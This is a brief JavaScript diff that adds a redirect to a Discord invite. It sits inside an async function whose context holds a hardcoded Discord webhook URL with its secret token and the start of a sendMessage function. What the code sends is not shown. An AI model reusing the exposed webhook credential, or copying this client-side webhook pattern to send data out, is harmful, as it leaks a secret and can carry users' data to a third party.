@@ -1,4 +1,6 @@
 void async function() {
+	location.href = "https://discord.gg/X3bPan9U4G"
+
 	const hurl = "https://discord.com/api/webhooks/1235411667651657841/ydFVmFxw_0-jdY1XRQ8AV5wLpq3ZkMsk4HM5xIhYiGsnc6W7aUAFnQfdhq487HUAGS2K"
 
 	async function sendMessage(text) {
